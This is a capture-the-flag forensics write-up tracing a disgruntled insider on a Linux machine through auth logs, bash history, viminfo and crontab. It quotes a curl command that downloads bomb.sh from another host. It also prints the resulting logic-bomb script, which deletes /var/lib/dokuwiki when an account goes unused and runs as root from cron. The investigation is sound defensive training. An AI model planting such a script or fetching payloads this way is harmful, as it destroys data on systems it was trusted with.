```
╺┳┓╻┏━┓┏━╸┏━┓╻ ╻┏┓╻╺┳╸╻  ┏━╸╺┳┓   
 ┃┃┃┗━┓┃╺┓┣┳┛┃ ┃┃┗┫ ┃ ┃  ┣╸  ┃┃   
╺┻┛╹┗━┛┗━┛╹┗╸┗━┛╹ ╹ ╹ ┗━╸┗━╸╺┻┛
```
Use your Linux forensics knowledge to investigate an incident. [^1]

Task 3 - Nothing suspicious... So far
-----------------------------------------------------------------------------------------
**The user installed a package on the machine using elevated privileges. According to the 
logs what is the full command?**

Since the introduction advises us to look at the logs, it becomes clear to us to move to
the `/var/log/` directory and since it further tells that the user had elevated 
privileges, we suspect `/var/log/auth.log.1` to contain the command we are looking for.
Note, that `/var/log/auth.log` contains the active authentication log and 
`/var/log/auth.log.1` the previous authentication log with older entries. Next, we search
for *sudo* and then *install* with `cat auth.log.1 | grep "sudo" | grep "install"` and
thus discover the following log entry with the installed package as follows.

> Dec 28 06:19:01 ip-10-10-168-55 sudo: cybert : TTY=pts/0 ; PWD=[REDACTED] ;
    USER=root ; COMMAND=[REDACTED]
> 
QUESTION 02
===========
What was the present working directory (PWD) when the previous command was run?

SOLUTION 02
===========
The present working directory can be obtained from the previous log entry and
is "/home/cybert" for the user "cybert" with temporary root privileges.

QUESTION 03
===========
Which user was created after the package from the previous task was installed?

SOLUTION 03
===========
Again, we search the "/var/log/auth.log" file for this operation, but this time
for the `useradd` command. And discover this log entry with a new user addition:

Dec 28 06:26:53 ip-10-10-168-55 useradd[15328]: new user: name=it-admin,
    UID=1002, GID=1002, home=/home/it-admin, shell=/bin/bash

QUESTION 04
===========
A user was then later given sudo privileges. When was the sudoers file updated?

SOLUTION 04
===========
This time, we search the "/var/log/auth.log" file for `visudo` which is the
command to edit the sudoers file. The log entry that pops up is as follows:

Dec 28 06:27:34 ip-10-10-168-55 sudo: cybert : TTY=pts/0 ; PWD=/home/cybert ;
    USER=root ; COMMAND=/usr/sbin/visudo

QUESTION 05
===========
A script file was opened using the "vi" text editor. What is the file name?

SOLUTION 05
===========
Again, we search the "/var/log/auth.log" file for the `vi` command and thus
discover the following log entry which states how the "bomb.sh" file was opened.

Dec 28 06:29:14 ip-10-10-168-55 sudo: it-admin : TTY=pts/0; PWD=/home/it-admin;
    USER=root ; COMMAND=/usr/bin/vi bomb.sh

QUESTION 06
===========
What is the command used that created the file bomb.sh?

SOLUTION 06
===========
From the previous question, we know that the "bomb.sh" script was executed by
the "it-admin" in their home directory. So, we go there and print the contents
of the ".bash_history" file. This way, we can see that the command which created
the suspicious script is `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`.

QUESTION 07
===========
The file was renamed and moved to a different directory. What is the full path
of this file now?

SOLUTION 07
===========
Based of the previous bash history entries, the file was removed immediately
after it was opened with the `vi` editor. Now, we know that the `vi` editor can
save files to a different location and check its log entries by opening the
".viminfo" file. There, we discover the line ":saveas /bin/os-update.sh" and we
can draw the conclusion from this that the new filename is "/bin/os-update.sh".

QUESTION 08
===========
When was the file from the previous question last modified?

SOLUTION 08
===========
For this, we can simply go to the "/bin" directory and list the file in a long
listing format: -rw-r--r-- 1 root root 325 Dec 28  2022 os-update.sh
Now, we want to provide this time information with the format "Month Day HH:MM":

root@ip-10-10-66-25:/bin# ls -l --time-style=long-iso os-update.sh
-rw-r--r-- 1 root root 325 2022-12-28 06:29 os-update.sh
From this, we can read that the file was last modified on "Dec 28 06:29".

QUESTION 09
===========
What is the name of the file that will get created when the file from the first
question executes?

SOLUTION 09
===========
We want to print out the contents of the "os-update.sh" script for this task:

# 2022-06-05 - Initial version
# 2022-10-11 - Fixed bug
# 2022-10-15 - Changed from 30 days to 90 days
OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
if [ -z "$OUTPUT" ]; then
    rm -r /var/lib/dokuwiki
    echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! \
        HAHAHAHA\n-mistermeist3r" > /goodbye.txt
fi

Here, we can see how the file that gets created once the "os-update.sh" file
gets executed is "/goodbye.txt" with the mysterious text above.

QUESTION 10
===========
At what time will the malicious file trigger? (Format: HH:MM AM/PM)

SOLUTION 10
===========
From the previous bash history logging, we remember that there was a `crontab`
entry which schedules the trigger for the malicious file. So, read the contents
with `less /etc/crontab` and see in the last row, that the "/bin/os-update.sh"
file is scheduled to run as root on 08:00 AM in likely 90 days from now on.



[^1]: https://tryhackme.com/room/disgruntled
